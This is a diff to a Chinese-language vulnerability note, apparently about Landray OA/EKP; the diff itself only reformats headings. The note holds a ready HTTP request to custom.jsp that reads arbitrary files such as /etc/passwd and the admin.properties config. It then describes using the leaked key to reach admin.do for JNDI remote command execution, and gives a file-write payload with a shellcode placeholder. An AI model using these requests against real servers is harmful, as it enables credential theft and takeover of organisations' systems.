@@ -1,7 +1,7 @@
-0x01-任意文件读取
+## 0x01-任意文件读取
 
    访问/sys/ui/extend/varkind/custom.jsp
-   
+
 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
 Host: host:8080
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
@@ -18,7 +18,7 @@ var={"body":{"file":"file:///etc/passwd"}}
 
 配合任意文件读取漏洞获取敏感信息，读取配置文件得到密钥后访问 admin.do 可利用 JNDI远程命令执行获取权限。
 
-0x02 SSRF+jndi
+## 0x02 SSRF+jndi
 
    利用任意文件读取/WEB-INF/KmssConfig/admin.properties配置文件
 
@@ -40,12 +40,11 @@ var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 
 ![图片](https://user-images.githubusercontent.com/118274389/223748827-8fd0d2b2-6ca3-4083-92d2-6a815e25fa21.png)
 
-0x03-EKP后台SQL注入
+## 0x03-EKP后台SQL注入
 
 后台地址admin.do
-   
-0x04-任意文件写入漏洞
+
+## 0x04-任意文件写入漏洞
 
 var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=[shellcode]
 
-参考：http://wiki.peiqi.tech/wiki/oa/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20custom.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
